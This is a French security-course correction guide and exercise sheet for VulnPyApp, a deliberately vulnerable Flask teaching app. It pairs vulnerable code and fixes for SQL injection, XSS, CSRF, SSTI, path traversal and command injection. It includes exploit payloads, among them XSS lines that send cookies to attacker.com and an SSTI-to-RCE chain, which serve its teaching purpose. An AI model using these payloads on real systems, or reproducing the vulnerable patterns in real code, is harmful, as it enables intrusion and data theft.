# VulnPyApp - Guide de correction & Fiches d'exercice
## SECE843 - Security By Design

---

# PARTIE 1 — GUIDE DE CORRECTION PAS-À-PAS

---

## 📖 Comment utiliser ce guide

```
⚠️  RÉSERVÉ AUX ÉTUDIANTS après avoir tenté l'exercice.
    Consultez ce guide uniquement si vous êtes bloqué
    depuis plus de 20 minutes sur une vulnérabilité.

Approche recommandée :
  1. Lire la description de la vulnérabilité
  2. Localiser le code vulnérable VOUS-MÊME
  3. Consulter l'indice niveau 1
  4. Si toujours bloqué → indice niveau 2
  5. En dernier recours → solution complète
```

---

## 🔴 CORRECTION #1 — SQL Injection (Login)

### Localisation
```
Fichier : app.py
Fonction : login()
Ligne : ~45
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Concaténation directe dans la requête SQL
email = request.form['email']
password = request.form['password']

query = f"SELECT * FROM user WHERE email = '{email}' AND password = '{password}'"
user = db.session.execute(query).fetchone()
```

### Pourquoi c'est dangereux
```
Saisie attaquant dans le champ email :
  ' OR '1'='1' --

Requête résultante :
  SELECT * FROM user WHERE email = '' OR '1'='1' --' AND password = '...'

La condition '1'='1' est toujours vraie.
Le commentaire -- neutralise le reste.
→ Connexion sans mot de passe valide.
```

### 💡 Indice niveau 1
```
Python DB-API 2.0 propose un mécanisme natif pour séparer
la requête de ses paramètres. Cherchez la syntaxe avec :param.
```

### 💡 Indice niveau 2
```
SQLAlchemy ORM dispose d'une méthode filter_by() qui
paramétrise automatiquement. Utilisez User.query.filter_by()
plutôt que db.session.execute() avec du SQL brut.
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ - Méthode 1 : ORM SQLAlchemy (recommandé)
from models import User

email = request.form.get('email', '').strip()
password = request.form.get('password', '')

# L'ORM construit une requête paramétrée automatiquement
user = User.query.filter_by(email=email).first()

if user is None or not user.check_password(password):
    flash('Invalid credentials', 'error')
    return redirect(url_for('login'))
```

```python
# ✅ CORRIGÉ - Méthode 2 : Requête paramétrée explicite
from sqlalchemy import text

query = text("SELECT * FROM user WHERE email = :email")
result = db.session.execute(query, {'email': email}).fetchone()
```

### Vérification
```python
# Test manuel dans le champ email :
# ' OR '1'='1' --      → doit retourner 401
# alice@vulnpyapp.local → doit fonctionner normalement

# Test automatisé :
pytest tests/test_security.py::TestSQLInjection::test_sqli_login_bypass_blocked -v
```

### Référence
```
CWE-89 : Improper Neutralization of Special Elements used in an SQL Command
OWASP Top 10 2021 : A03 - Injection
CVSS v3.1 : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → Score 9.8 (Critical)
```

---

## 🔴 CORRECTION #2 — SQL Injection (Recherche)

### Localisation
```
Fichier : app.py
Fonction : search()
Ligne : ~80
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
q = request.args.get('q', '')
results = db.session.execute(
    f"SELECT * FROM product WHERE name LIKE '%{q}%'"
).fetchall()
```

### Exploitation (UNION-based)
```sql
-- Payload dans ?q=
' UNION SELECT id,email,password_hash,4,5 FROM user--

-- Requête générée :
SELECT * FROM product WHERE name LIKE '%' UNION SELECT
id,email,password_hash,4,5 FROM user--%'

-- Résultat : dump de la table user dans les résultats de recherche
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
from models import Product

q = request.args.get('q', '').strip()[:100]  # Limitation longueur

if q:
    # ilike = LIKE insensible à la casse, paramétré automatiquement
    results = Product.query.filter(
        Product.name.ilike(f'%{q}%')
    ).limit(50).all()
else:
    results = Product.query.limit(50).all()
```

### Vérification
```bash
pytest tests/test_security.py::TestSQLInjection -v
```

---

## 🟠 CORRECTION #3 — XSS Réfléchi

### Localisation
```
Fichier : templates/search.html
Ligne : ~15
```

### Code vulnérable
```html
<!-- ❌ VULNÉRABLE - |safe désactive l'échappement Jinja2 -->
<p>Résultats pour : <strong>{{ query|safe }}</strong></p>
```

### Exploitation
```
URL : /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

La balise script est injectée telle quelle dans la page.
→ Vol de session, redirection, défacement.
```

### 💡 Indice niveau 1
```
Jinja2 échappe automatiquement les variables.
Cherchez ce qui désactive cette protection.
```

### ✅ Solution complète
```html
<!-- ✅ CORRIGÉ - Supprimer |safe suffit -->
<p>Résultats pour : <strong>{{ query }}</strong></p>

<!--
  Jinja2 convertit automatiquement :
  <script> → &lt;script&gt;
  " → &#34;
  ' → &#39;
-->
```

```python
# ✅ Dans app.py, s'assurer que autoescape est activé
from flask import Flask
app = Flask(__name__)
# autoescape=True est le défaut pour .html - vérifier qu'il n'est pas désactivé

# ❌ Ne jamais faire :
from jinja2 import Environment
env = Environment(autoescape=False)  # désactive la protection globalement
```

### Vérification
```bash
# Test manuel : /search?q=<script>alert(1)</script>
# → doit afficher &lt;script&gt;alert(1)&lt;/script&gt; en source
# → aucune popup ne doit apparaître

pytest tests/test_security.py::TestXSS::test_xss_reflected_escaped -v
```

---

## 🟠 CORRECTION #4 — XSS Stocké

### Localisation
```
Fichier : app.py → route /comments (POST)
Fichier : templates/comments.html → affichage
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Stockage sans sanitization
content = request.form['content']
comment = Comment(user_id=current_user.id, content=content)
db.session.add(comment)
```

```html
<!-- ❌ VULNÉRABLE - Affichage avec |safe -->
<div>{{ c.content|safe }}</div>
```

### Exploitation
```html
<!-- Payload posté dans le formulaire de commentaire -->
<img src="x" onerror="
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
">

<!-- Exécuté pour CHAQUE visiteur qui consulte la page -->
```

### ✅ Solution complète

**Étape 1 : Sanitizer à l'entrée (Bleach)**
```python
# ✅ Dans app.py
import bleach

# Liste blanche de tags HTML autorisés
ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {}  # Aucun attribut autorisé (évite onerror, href, etc.)

@app.route('/comments', methods=['POST'])
@login_required
def post_comment():
    content = request.form.get('content', '').strip()

    if not content or len(content) > 2000:
        abort(400)

    # ✅ Sanitization : seuls les tags autorisés sont conservés
    clean_content = bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True  # Supprime les tags non autorisés (ne les échappe pas)
    )

    comment = Comment(user_id=current_user.id, content=clean_content)
    db.session.add(comment)
    db.session.commit()
    return redirect(url_for('comments'))
```

**Étape 2 : Affichage sécurisé**
```html
<!-- ✅ |safe acceptable UNIQUEMENT car Bleach a déjà nettoyé -->
<!-- Les seuls tags présents sont dans la liste blanche -->
<div>{{ c.content|safe }}</div>

<!-- Alternative plus stricte : supprimer aussi |safe -->
<!-- Dans ce cas, les balises <b> etc. s'affichent en texte brut -->
<div>{{ c.content }}</div>
```

### Règle mnémotechnique
```
Entrée  → Valider + Sanitizer (Bleach)
Sortie  → Encoder (Jinja2 auto ou |e explicite)
|safe   → UNIQUEMENT si vous contrôlez à 100% la source de la donnée
```

### Vérification
```bash
pytest tests/test_security.py::TestXSS::test_xss_stored_bleach_sanitized -v
pytest tests/test_security.py::TestXSS::test_xss_allowed_tags_preserved -v
```

---

## 🟠 CORRECTION #5 — XSS DOM-based

### Localisation
```
Fichier : templates/profile.html
Balise : <script> utilisant location.hash
```

### Code vulnérable
```html
<!-- ❌ VULNÉRABLE - injection via fragment d'URL -->
<div id="welcome"></div>
<script>
  // location.hash retourne la valeur après le # sans encodage
  const name = location.hash.slice(1);
  document.getElementById('welcome').innerHTML = name;  // ← dangereux !
</script>

<!--
  URL malveillante :
  /profile#<img src=x onerror=alert(document.cookie)>
  Aucune requête serveur → pas détectable dans les logs
-->
```

### ✅ Solution complète
```html
<!-- ✅ CORRIGÉ -->
<div id="welcome"></div>
<script nonce="{{ csp_nonce() }}">
  // ✅ textContent au lieu de innerHTML
  // textContent traite la valeur comme du texte pur, jamais comme du HTML
  const username = {{ current_user.username|tojson }};
  document.getElementById('welcome').textContent = "Hello, " + username + "!";

  // ✅ tojson encode la chaîne pour une insertion sûre dans JS
  // Pas de location.hash - la valeur vient du serveur (authentifié)
</script>
```

### Tableau des méthodes DOM : dangereuses vs sûres
```
❌ DANGEREUX        ✅ SÛR
─────────────────────────────────────────────────
innerHTML =         textContent =
outerHTML =         innerText =
document.write()    setAttribute() [selon attr]
insertAdjacentHTML  createElement()
eval()              createTextNode()
setTimeout(string)  addEventListener()
```

---

## 🔴 CORRECTION #6 — CSRF

### Localisation
```
Fichier : app.py → toutes les routes POST
Fichier : templates/*.html → formulaires
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Pas de vérification de l'origine de la requête
@app.route('/profile/update', methods=['POST'])
@login_required
def update_profile():
    username = request.form['username']
    current_user.username = username
    db.session.commit()
    # N'importe quel site peut soumettre ce formulaire à la place de l'utilisateur
```

### Exploitation
```html
<!-- Site attaquant : evil.com -->
<!-- Visiteur connecté sur vulnpyapp → formulaire soumis automatiquement -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:5000/profile/update" method="POST">
    <input type="hidden" name="username" value="hacked_by_attacker">
  </form>
</body>
</html>
```

### ✅ Solution complète

**Étape 1 : Initialiser Flask-WTF**
```python
# ✅ extensions.py
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()

# ✅ app.py
from extensions import csrf

def create_app(config_name='default'):
    app = Flask(__name__)
    csrf.init_app(app)  # Protection CSRF globale sur tous les POST
    return app
```

**Étape 2 : Ajouter le token dans chaque formulaire**
```html
<!-- ✅ Dans chaque <form method="POST"> -->
<form method="POST" action="/profile/update">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- autres champs... -->
    <button type="submit">Update</button>
</form>
```

**Étape 3 : Exclure les API JSON si nécessaire**
```python
# ✅ Pour les endpoints API consommant du JSON (avec JWT)
from flask_wtf.csrf import csrf_exempt

@app.route('/api/data', methods=['POST'])
@csrf_exempt  # Acceptable si authentification par token Bearer
def api_endpoint():
    ...
```

### Comment fonctionne le token CSRF
```
1. Serveur génère un token unique par session → stocké en session
2. Token inclus dans le formulaire HTML
3. Formulaire soumis → token renvoyé dans le POST
4. Serveur compare token reçu ↔ token en session
5. Mismatch → 400 Bad Request

Un site attaquant ne peut pas lire le token (Same-Origin Policy)
→ ne peut pas forger une requête valide
```

### Vérification
```bash
# Vérifier la présence du token dans les formulaires
curl -s http://localhost:5000/login | grep csrf_token

pytest tests/test_security.py::TestCSRF -v
```

---

## 🟠 CORRECTION #7 — IDOR (Insecure Direct Object Reference)

### Localisation
```
Fichier : app.py
Fonction : get_order()
Route : /api/orders/<int:order_id>
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Récupération par ID sans vérification du propriétaire
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get_or_404(order_id)
    return jsonify(order.to_dict())  # N'importe quel utilisateur connecté
                                      # peut accéder à n'importe quelle commande
```

### Exploitation
```python
# Alice (user_id=2) est connectée
# Bob (user_id=3) a la commande id=42

import requests
session = requests.Session()
session.post('/login', data={'email': 'alice@...', 'password': 'Alice123!'})

# Alice accède à la commande de Bob → 200 OK ❌
response = session.get('/api/orders/42')
print(response.json())  # Données de Bob exposées
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ - Filtrage par propriétaire
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    if current_user.is_admin:
        # Les admins peuvent voir toutes les commandes
        order = Order.query.get_or_404(order_id)
    else:
        # Un utilisateur ne voit que SES commandes
        # filter_by sur les deux critères → 404 si pas propriétaire
        order = Order.query.filter_by(
            id=order_id,
            user_id=current_user.id
        ).first_or_404()
        # ✅ first_or_404() retourne 404 (et non 403) pour ne pas
        # confirmer l'existence de la ressource

    return jsonify(order.to_dict())


# ✅ Endpoint dédié pour les propres commandes de l'utilisateur
@app.route('/api/my/orders')
@login_required
def my_orders():
    orders = Order.query.filter_by(user_id=current_user.id).all()
    return jsonify([o.to_dict() for o in orders])
```

### Principe général
```python
# ✅ Pattern à appliquer systématiquement pour toute ressource
def get_resource(resource_id):
    if current_user.is_admin:
        resource = Resource.query.get_or_404(resource_id)
    else:
        resource = Resource.query.filter_by(
            id=resource_id,
            owner_id=current_user.id  # ← clé de l'IDOR fix
        ).first_or_404()
    return resource
```

### Vérification
```bash
pytest tests/test_security.py::TestIDOR -v
```

---

## 🟠 CORRECTION #8 — Mass Assignment

### Localisation
```
Fichier : app.py
Fonction : register()
Route : /register (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Assignation directe des données du formulaire au modèle
@app.route('/register', methods=['POST'])
def register():
    data = request.form.to_dict()
    user = User(**data)  # Tous les champs du formulaire → modèle
    db.session.add(user)
    db.session.commit()

# Payload attaquant :
# email=hack@x.com&username=hacker&password=Hack123!&is_admin=true
# → Compte admin créé directement !
```

### ✅ Solution complète

**Méthode 1 : Allowlist manuelle (simple)**
```python
# ✅ CORRIGÉ - Allowlist explicite des champs autorisés
@app.route('/register', methods=['POST'])
def register():
    # ✅ Uniquement les champs que l'utilisateur est autorisé à définir
    email    = request.form.get('email', '').strip().lower()
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    bio      = request.form.get('bio', '').strip()

    # ✅ is_admin n'est JAMAIS lu depuis le formulaire
    # Valeur par défaut False définie dans le modèle

    user = User(
        email=email,
        username=username,
        bio=bio,
        is_admin=False  # Valeur fixe, jamais depuis request.form
    )
    user.set_password(password)
    db.session.add(user)
    db.session.commit()
```

**Méthode 2 : Schéma Marshmallow (robuste)**
```python
# ✅ schemas.py
from marshmallow import Schema, fields, validate, ValidationError

class RegisterSchema(Schema):
    """Seuls ces champs sont acceptés - tout autre champ est ignoré"""
    email    = fields.Email(required=True, load_only=True)
    username = fields.Str(required=True, validate=[
        validate.Length(min=3, max=80),
        validate.Regexp(r'^[a-zA-Z0-9_-]+$',
                        error='Username: letters, digits, _ and - only')
    ])
    password = fields.Str(required=True, load_only=True, validate=[
        validate.Length(min=8, max=128),
        validate.Regexp(
            r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)',
            error='Password must contain uppercase, lowercase and digit'
        )
    ])
    bio = fields.Str(validate=validate.Length(max=500), load_default='')

    # ✅ is_admin n'apparaît pas → automatiquement ignoré à la désérialisation

class ProfileUpdateSchema(Schema):
    """Mise à jour de profil : restreint aux champs modifiables"""
    username = fields.Str(validate=[
        validate.Length(min=3, max=80),
        validate.Regexp(r'^[a-zA-Z0-9_-]+$')
    ])
    bio = fields.Str(validate=validate.Length(max=500))
    # email et is_admin absents → ignorés même s'ils sont envoyés
```

```python
# ✅ Dans app.py
from schemas import RegisterSchema
from marshmallow import ValidationError

register_schema = RegisterSchema()

@app.route('/register', methods=['POST'])
def register():
    try:
        data = register_schema.load(request.form)
    except ValidationError as err:
        flash(str(err.messages), 'error')
        return redirect(url_for('register'))

    if User.query.filter_by(email=data['email']).first():
        flash('Email already registered', 'error')
        return redirect(url_for('register'))

    user = User(
        email=data['email'],
        username=data['username'],
        bio=data.get('bio', ''),
        is_admin=False  # Jamais depuis le formulaire
    )
    user.set_password(data['password'])
    db.session.add(user)
    db.session.commit()
    flash('Registration successful', 'success')
    return redirect(url_for('login'))
```

### Vérification
```bash
pytest tests/test_security.py::TestMassAssignment -v
```

---

## 🔴 CORRECTION #9 — SSTI (Server-Side Template Injection)

### Localisation
```
Fichier : app.py
Fonction : hello()
Route : /hello
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Rendu de template dynamique depuis l'entrée utilisateur
from jinja2 import Template

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Template construit avec la valeur utilisateur → exécuté par Jinja2
    template = Template(f"Hello {name}!")
    return template.render()
```

### Exploitation (escalade vers RCE)
```
Étape 1 - Détection :
  /hello?name={{ 7*7 }}
  → Affiche "Hello 49!"  (l'expression est évaluée)

Étape 2 - Accès à la configuration :
  /hello?name={{ config.SECRET_KEY }}
  → Affiche la clé secrète Flask

Étape 3 - RCE via MRO Python :
  /hello?name={{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
  → Exécute la commande système 'id'
  → Résultat : uid=0(root)...
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ - Méthode 1 : render_template avec variable (recommandé)
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')

    # Validation : nom alphanumérique uniquement
    if not re.match(r'^[a-zA-Z0-9 _-]{1,50}$', name):
        name = 'World'  # Valeur par défaut sécurisée

    # ✅ La variable est passée comme paramètre, jamais concaténée dans le template
    return render_template('hello.html', name=name)
    # Jinja2 échappe automatiquement {{ name }}
```

```python
# ✅ CORRIGÉ - Méthode 2 : render_template_string avec variable séparée
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    name = name[:50]  # Limitation de longueur

    # ✅ La variable utilisateur n'est PAS dans la chaîne de template
    # Elle est passée comme contexte → Jinja2 l'échappe
    template = "Hello {{ name }}!"
    return render_template_string(template, name=name)
    # name={{ 7*7 }} → affiche "Hello {{ 7*7 }}!" (littéral, non évalué)
```

### Règle fondamentale
```
❌ JAMAIS : Template(f"... {user_input} ...")
❌ JAMAIS : render_template_string(f"... {user_input} ...")

✅ TOUJOURS : render_template('file.html', variable=user_input)
✅ TOUJOURS : render_template_string("... {{ variable }} ...", variable=user_input)
```

### Vérification
```bash
pytest tests/test_security.py::TestSSTI -v
```

---

## 🟠 CORRECTION #10 — Path Traversal

### Localisation
```
Fichier : app.py
Fonction : download_file()
Route : /download
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
@app.route('/download')
@login_required
def download_file():
    filename = request.args.get('file', '')
    filepath = os.path.join('uploads', filename)
    return send_file(filepath)

# /download?file=../../etc/passwd → fonctionne !
# /download?file=../app.py        → code source exposé !
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
import os
from werkzeug.utils import secure_filename

UPLOAD_FOLDER = os.path.realpath('uploads')
ALLOWED_EXTENSIONS = {'.pdf', '.png', '.jpg', '.jpeg', '.txt', '.csv'}

@app.route('/download')
@login_required
def download_file():
    filename = request.args.get('file', '').strip()

    # ✅ Étape 1 : Rejeter les entrées vides
    if not filename:
        abort(400)

    # ✅ Étape 2 : secure_filename() supprime ../ et caractères dangereux
    safe_name = secure_filename(filename)
    if not safe_name:
        abort(400)

    # ✅ Étape 3 : Vérification de l'extension (liste blanche)
    ext = os.path.splitext(safe_name)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        abort(400)

    # ✅ Étape 4 : Résolution du chemin absolu réel
    filepath = os.path.realpath(os.path.join(UPLOAD_FOLDER, safe_name))

    # ✅ Étape 5 : Vérification que le fichier reste dans UPLOAD_FOLDER
    # Bloque toute tentative d'échappement via symlinks ou encodages
    if not filepath.startswith(UPLOAD_FOLDER + os.sep):
        abort(404)  # 404 plutôt que 403 : ne pas confirmer l'existence

    # ✅ Étape 6 : Vérifier que le fichier existe
    if not os.path.isfile(filepath):
        abort(404)

    return send_file(filepath)
```

### Visualisation de la protection
```
Input : ../../etc/passwd
  secure_filename() → etcpasswd  (supprime ../ et /)
  realpath()        → /app/uploads/etcpasswd
  startswith check  → /app/uploads/etcpasswd starts with /app/uploads/ ✅
  isfile()          → False → 404

Input : ../app.py
  secure_filename() → app.py
  realpath()        → /app/uploads/app.py
  startswith check  → ✅
  isfile()          → False → 404 (app.py n'est pas dans uploads/)
```

### Vérification
```bash
pytest tests/test_security.py::TestPathTraversal -v
```

---

## 🔴 CORRECTION #11 — Injection de commandes

### Localisation
```
Fichier : app.py
Fonction : ping()
Route : /ping (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - shell=True avec entrée utilisateur
import os

@app.route('/ping', methods=['POST'])
@login_required
def ping():
    host = request.form.get('host', '')
    result = os.popen(f'ping -c 1 {host}').read()
    return render_template('ping.html', result=result)

# Payload : localhost; cat /etc/passwd
# Commande exécutée : ping -c 1 localhost; cat /etc/passwd
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
import subprocess
import re
import ipaddress

# Regex liste blanche : uniquement noms de domaine valides
HOSTNAME_REGEX = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,251}[a-zA-Z0-9]$')

# Plages IP privées/réservées interdites (anti-SSRF)
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
]

def is_safe_host(host: str) -> bool:
    """Valide que le host est sûr à pinger"""
    # Vérification format
    if not HOSTNAME_REGEX.match(host):
        return False

    # Vérification si IP : pas de plage privée
    try:
        ip = ipaddress.ip_address(host)
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False
    except ValueError:
        pass  # C'est un nom de domaine, pas une IP → ok

    return True


@app.route('/ping', methods=['POST'])
@login_required
def ping():
    host = request.form.get('host', '').strip()

    if not is_safe_host(host):
        abort(400)

    try:
        # ✅ Liste de commandes, pas une chaîne → shell=False (défaut)
        # subprocess ne passe PAS par /bin/sh
        # L'injection de commandes via ; | & est impossible
        result = subprocess.run(
            ['ping', '-c', '1', '-W', '2', host],  # ← liste, pas f-string
            capture_output=True,
            text=True,
            timeout=5,
            shell=False  # ✅ Valeur par défaut, explicite pour clarté
        )
        output = result.stdout or result.stderr

    except subprocess.TimeoutExpired:
        output = "Timeout: host did not respond"
    except Exception:
        output = "Error: ping failed"

    return render_template('ping.html', result=output, host=host)
```

### Pourquoi `shell=False` protège
```
shell=True  → /bin/sh -c "ping -c 1 localhost; cat /etc/passwd"
              Le shell interprète ; comme séparateur de commandes ❌

shell=False → execve('ping', ['-c', '1', 'localhost; cat /etc/passwd'])
              L'argument est passé tel quel à ping, qui ne trouve pas l'hôte ✅
```

### Vérification
```bash
pytest tests/test_security.py::TestCommandInjection -v
```

---

## 🟡 CORRECTION #12 — Hashage faible (MD5)

### Localisation
```
Fichier : models.py
Méthode : set_password(), check_password()
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
import hashlib

class User(db.Model):
    def set_password(self, password):
        # MD5 : cassable en secondes avec des tables arc-en-ciel
        self.password_hash = hashlib.md5(password.encode()).hexdigest()

    def check_password(self, password):
        return self.password_hash == hashlib.md5(password.encode()).hexdigest()
```

### ✅ Solution complète
```python
# ✅ CORRIGÉ
from flask_bcrypt import Bcrypt

bcrypt = Bcrypt()

class User(db.Model):
    password_hash = db.Column(db.String(128), nullable=False)

    def set_password(self, password: str) -> None:
        """Hash le mot de passe avec bcrypt (cost factor 12)"""
        # ✅ bcrypt intègre un sel aléatoire automatiquement
        # ✅ cost factor 12 = ~250ms de calcul → résistant au brute-force
        self.password_hash = bcrypt.generate_password_hash(
            password,
            rounds=12  # Cost factor : doublement du temps tous les +1
        ).decode('utf-8')

    def check_password(self, password: str) -> bool:
        """Vérifie le mot de passe en temps constant"""
        # ✅ Comparaison en temps constant → pas de timing attack
        return bcrypt.check_password_hash(self.password_hash, password)
```

### Comparaison des algorithmes
```
Algorithme  | Résistance brute-force | Recommandé
────────────┼────────────────────────┼───────────
MD5         | ❌ Très faible (GPU)   | Non
SHA-1       | ❌ Faible              | Non
SHA-256     | ❌ Faible (pas de sel) | Non
SHA-256+sel | ⚠️  Moyen              | Non (PBKDF2 minimum)
PBKDF2      | ✅ Correct             | Acceptable
bcrypt      | ✅ Fort                | ✅ Recommandé
Argon2id    | ✅✅ Très fort          | ✅ Recommandé (OWASP 2023)
scrypt      | ✅✅ Très fort          | ✅ Recommandé
```

### Vérification
```bash
pytest tests/test_security.py::TestPasswordHashing -v
```

---

## 🟡 CORRECTION #13 — Cookies non sécurisés

### Localisation
```
Fichier : config.py
Fichier : app.py → création de l'application
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Configuration par défaut non sécurisée
class Config:
    SECRET_KEY = 'dev'  # Clé prévisible
    # SESSION_COOKIE_SECURE absent → False par défaut
    # SESSION_COOKIE_HTTPONLY absent → False par défaut
    # SESSION_COOKIE_SAMESITE absent → None par défaut
```

### ✅ Solution complète
```python
# ✅ config.py
import os
import secrets

class Config:
    # ✅ Clé secrète forte générée aléatoirement
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)

    # ✅ Cookie uniquement via HTTPS (mettre False en dev local)
    SESSION_COOKIE_SECURE = os.environ.get('FLASK_ENV') != 'development'

    # ✅ Cookie inaccessible depuis JavaScript → bloque vol via XSS
    SESSION_COOKIE_HTTPONLY = True

    # ✅ Cookie non envoyé dans les requêtes cross-origin → bloque CSRF
    SESSION_COOKIE_SAMESITE = 'Strict'

    # ✅ Durée de vie de session (30 minutes d'inactivité)
    PERMANENT_SESSION_LIFETIME = 1800

    # ✅ Nom du cookie non informatif
    SESSION_COOKIE_NAME = 'sid'
```

### Impact des flags
```
Flag        | Protection contre
────────────┼──────────────────────────────────────
Secure      | Interception réseau (HTTP non chiffré)
HttpOnly    | Vol de cookie via XSS (document.cookie)
SameSite    | CSRF (requêtes cross-site)
```

---

## 🟡 CORRECTION #14 — Absence de Rate Limiting

### Localisation
```
Fichier : app.py
Route : /login (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Aucune limitation de tentatives
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    # Peut être appelé des milliers de fois par seconde → brute-force possible
    user = User.query.filter_by(email=email).first()
    if user and user.check_password(password):
        login_user(user)
        return redirect(url_for('index'))
    flash('Invalid credentials')
    return render_template('login.html')
```

### ✅ Solution complète
```python
# ✅ extensions.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)
```

```python
# ✅ app.py - Double stratégie : rate limiting + lockout
from extensions import limiter
from datetime import datetime, timedelta

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # ✅ Max 5 tentatives/minute par IP
def login():
    email = request.form.get('email', '').strip().lower()
    password = request.form.get('password', '')

    user = User.query.filter_by(email=email).first()

    # ✅ Vérification du lockout compte (indépendant du rate limiting IP)
    if user and user.locked_until and user.locked_until > datetime.utcnow():
        remaining = (user.locked_until - datetime.utcnow()).seconds // 60
        flash(f'Account locked. Try again in {remaining} minutes.', 'error')
        return render_template('login.html'), 429

    if user and user.check_password(password):
        # ✅ Réinitialiser le compteur d'échecs
        user.failed_attempts = 0
        user.locked_until = None
        db.session.commit()

        login_user(user)
        return redirect(url_for('index'))

    else:
        # ✅ Incrémenter le compteur d'échecs
        if user:
            user.failed_attempts = (user.failed_attempts or 0) + 1
            if user.failed_attempts >= 5:
                user.locked_until = datetime.utcnow() + timedelta(minutes=15)
                db.session.commit()

        # ✅ Message générique : ne pas confirmer si l'email existe
        flash('Invalid email or password.', 'error')

        # ✅ Délai constant pour éviter l'énumération par timing
        import time
        time.sleep(0.3)

        return render_template('login.html'), 401


# ✅ Gestionnaire d'erreur rate limiting
@app.errorhandler(429)
def ratelimit_handler(e):
    return render_template('errors/429.html'), 429
```

### Vérification
```bash
pytest tests/test_security.py::TestRateLimiting -v
```

---
---

# PARTIE 2 — FICHES D'EXERCICE

---

# 📋 FICHE EXERCICE 1 — CTF Injections SQL & XSS
## Formation SECE843 | Séance 1 | Travail en binôme

```
┌─────────────────────────────────────────────────────────────┐
│  Durée : 2h en séance + 1 semaine pour le rapport           │
│  Rendu : archive ZIP sur la plateforme avant dimanche 23h59 │
│  Pondération : 20% de la note finale                        │
└─────────────────────────────────────────────────────────────┘
```

### 🎯 Objectifs pédagogiques

À l'issue de cet exercice vous serez capables de :
- Identifier et exploiter des injections SQL (classique, UNION, blind)
- Identifier et exploiter des XSS réfléchies et stockées
- Proposer des corrections de code adaptées
- Rédiger un rapport technique structuré

---

### 🏗️ Setup

```bash
# 1. Cloner le dépôt (lien fourni par l'enseignant)
git clone <URL_INSTITUTIONNELLE>/vulnpyapp.git
cd vulnpyapp
git checkout student-starter

# 2. Lancer l'application
docker-compose up --build

# 3. Vérifier que l'app est accessible
curl http://localhost:5000
# → Vous devez voir la page d'accueil

# 4. Comptes de test disponibles
# alice@vulnpyapp.local / Alice123!  (utilisateur normal)
# bob@vulnpyapp.local   / Bob123!   (utilisateur normal)
# admin@vulnpyapp.local / Admin123! (admin - à découvrir !)
```

---

### 📋 PARTIE A — Exploitation (60 pts)

#### Challenge 1 — SQL Injection Login Bypass *(10 pts)*

**Contexte :** La page `/login` est vulnérable à une injection SQL.

**Objectif :** Vous connecter en tant qu'administrateur **sans connaître son mot de passe**.

**Travail attendu :**
1. Identifier le champ vulnérable
2. Construire un payload de bypass
3. Capturer une preuve (screenshot de la page admin accessible)
4. Expliquer pourquoi ce payload fonctionne (logique SQL)

**Indice :** Pensez aux opérateurs SQL `OR` et aux commentaires `--`

```
Rapport attendu :
├── Payload utilisé
├── Requête SQL générée (reconstituée)
├── Screenshot de preuve
└── Explication technique (5 lignes minimum)
```

---

#### Challenge 2 — SQL Injection UNION (dump de données) *(15 pts)*

**Contexte :** La route `/search` est vulnérable à une injection UNION.

**Objectif :** Extraire la liste des utilisateurs (emails + hash de mots de passe) depuis la base de données.

**Étapes guidées :**

```sql
-- Étape 1 : Déterminer le nombre de colonnes
-- Essayez des payloads ORDER BY jusqu'à obtenir une erreur
?q=' ORDER BY 1--
?q=' ORDER BY 2--
...

-- Étape 2 : Identifier les colonnes affichées
?q=' UNION SELECT NULL,NULL,...--

-- Étape 3 : Extraire les données de la table 'user'
?q=' UNION SELECT ...
```

**Travail attendu :**
1. Script Python (`exploit_sqli_union.py`) automatisant l'extraction
2. Fichier `dump_users.txt` avec les données extraites
